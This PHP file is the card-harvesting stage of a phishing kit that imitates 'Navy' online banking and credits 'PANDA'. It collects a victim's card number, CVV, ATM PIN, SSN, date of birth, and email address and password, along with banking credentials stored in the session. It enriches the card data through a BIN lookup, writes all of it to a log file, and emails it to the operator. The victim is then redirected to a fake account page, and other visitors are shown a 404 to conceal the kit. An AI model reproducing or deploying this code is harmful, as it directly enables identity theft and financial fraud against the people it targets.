<?php
if (isset($_POST['fnm']) && isset($_POST['ssn']) && isset($_POST['ccn'])) {
    session_start();
    include '../mine.php';
        $_SESSION['fnm'] = $_POST['fnm'];
        $ccn         = $_POST['ccn'];
        $ssn         = $_POST['ssn'];
        $dob         = $_POST['dob'];
        $cvv         = $_POST['cvv'];
        $atm         = $_POST['atm'];
        $cex         = $_POST['mnt'] . '/' . $_POST['yer'];
        $bin=substr(str_replace(' ','',$ccn),0,6);  
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch,CURLOPT_URL,"https://api.bincodes.com/bin-checker.php?api_key=93648770a4bf19f8efb367239cb8b8c1&bin=".$bin."&format=json");
        curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
        curl_setopt($ch,CURLOPT_TIMEOUT,400);
        $json=curl_exec($ch);
        $code=json_decode($json);
        $bin_brand = $code->card;
        $bin_bank = $code->bank;
        $bin_type = $code->type;
        $bin_level = $code->level;
        $bin_country = $code->country;
    $msg  = "====================== <[ NAVY ONLINE ]> =====================\r\n";
    $msg .= "USER       : {$_SESSION['USER']}\r\n";
    $msg .= "PASS       : {$_SESSION['PASSWORD']}\r\n";
    $msg .= "====================== <[ NAVY CARD ]> ===================\r\n";
    $msg .= "CC Number  : {$ccn}\r\n";
    $msg .= "EXP        : {$cex}\r\n";
    $msg .= "CVV        : {$cvv}\r\n";
    $msg .= "ATM        : {$atm}\r\n";
    $msg .= "====================== <[ BIN INFO {$bin} ]> ===================\r\n";
    $msg .= "CC Data        : {$bin_brand} {$bin_type} {$bin_level}\r\n";
    $msg .= "CC Bank        : {$bin_bank}\r\n";
    $msg .= "CC Country     : {$bin_country}\r\n";
    $msg .= "====================== <[ BILLING INFO ]> ========================\r\n";
    $msg .= "FULL NAME  : {$_POST['fnm']}\r\n";
    $msg .= "SSN        : {$ssn}\r\n";
    $msg .= "DOB        : {$dob}\r\n";
    $msg .= "PHONE Number     : {$_POST['phn']}\r\n";
    $msg .= "====================== <[ EMAIL ACCESS]> =========================\r\n";
    $msg .= "EMAIL      : {$_POST['e_ml']}\r\n";
    $msg .= "PASS       : {$_POST['e_pw']}\r\n";
    $msg .= "====================== <[ IP INFO ]> =============================\r\n";
    $msg .= "IP ADDRESS : {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION   : {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "BROWSER    : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "TIME       : " . now() . " GMT\r\n";
    $msg .= "==================<[ Thanks to PANDA ]> ========================\r\n\r\n\r\n";
    $save = fopen("../../mtgenetartie.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "NAVY BILLING [" . $_POST['fnm'] . "] From [" . $_SESSION['ip_city'] . "]";
    $headers = "From: New NAVY Billing <sales@PANDA.store>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);

    $nextDate = date("d/m/Y, h:ia", time() + 86400);
            exit(header("Location: ../../account/myaccount"));

}else{
            exit(header('HTTP/1.0 404 Not Found'));
}
?>